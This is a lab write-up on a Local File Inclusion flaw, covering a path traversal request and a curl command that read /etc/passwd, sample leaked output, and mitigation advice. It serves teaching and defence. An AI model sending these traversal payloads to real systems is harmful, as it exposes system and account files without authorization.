# 🛡️ Local File Inclusion – /etc/passwd Disclosure

[![Lab Type](https://img.shields.io/badge/Lab-Web_Exploit-blue)](https://github.com/)  
[![Severity](https://img.shields.io/badge/Severity-High-red)](https://github.com/)  
[![Information Disclosure](https://img.shields.io/badge/Impact-Info_Disclosure-orange)](https://owasp.org/)  
[![LFI](https://img.shields.io/badge/Vulnerability-LFI-yellow)](https://owasp.org/)  
[![Linux](https://img.shields.io/badge/Target-Linux-lightgrey)](https://www.kernel.org/)  

---

## 📑 Table of Contents

1. [Overview](#overview)  
2. [Objective](#objective)  
3. [Vulnerability Description](#vulnerability-description)  
4. [Exploitation Steps](#exploitation-steps)  
5. [Proof of Exploit](#proof-of-exploit)  
6. [Proof of Concept](#proof-of-concept)  
7. [Mitigation](#mitigation)  
8. [References](#references)  

---

## Overview

This lab demonstrates a **Local File Inclusion (LFI)** vulnerability in a simulated web application. By manipulating parameters, an attacker can retrieve sensitive system files such as `/etc/passwd`.  

---

## Objective

- Understand Local File Inclusion (LFI) vulnerabilities  
- Learn how improper file handling can lead to sensitive data exposure  
- Practice safe exploitation in a controlled environment  

---

## Vulnerability Description

Local File Inclusion occurs when a web application dynamically loads files based on **user input** without proper validation.  

In this lab:  

- The server mislabels responses (e.g., returning `/etc/passwd` with `Content-Type: image/jpeg`)  
- Attackers can request arbitrary files from the system  
- This results in the disclosure of **sensitive information** such as usernames and service accounts  

---

## Exploitation Steps

1. Intercept a vulnerable request using **Burp Suite** or browser dev tools.  
2. Manipulate the file parameter to include `/etc/passwd`. Example:  

   ```
   GET /vulnerable.php?page=../../../../etc/passwd HTTP/1.1
   Host: target.com
   ```
3. Observe the server’s response. Despite a `200 OK` and `image/jpeg` header, the body leaks system file contents.  

---

## PROOF OF EXPLOIT

```

...
```

<img width="1916" height="1079" alt="File path traversal, simple case" src="https://github.com/user-attachments/assets/751c1972-ccb9-45a8-810a-3b10887d50cf" />

---

## Proof of Concept

Using `curl` to fetch `/etc/passwd` through the vulnerable endpoint:  

```bash
curl "http://target.com/vulnerable.php?page=../../../../etc/passwd"
```

Output:  

```
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:106:107:MySQL Server:/nonexistent:/bin/false
...
```

---

## Mitigation

* **Validate and sanitize user input** before using it in file operations  
* **Restrict file access** using whitelists (only allow known safe files)  
* **Use a chroot jail or containerization** to limit file system exposure  
* **Disable detailed error messages** in production environments  
* **Apply the principle of least privilege** for the web server user  

---

## References

* [OWASP: Local File Inclusion](https://owasp.org/www-community/attacks/Path_Traversal)  
* [CWE-98: Improper Control of Filename for Include/Req]()*
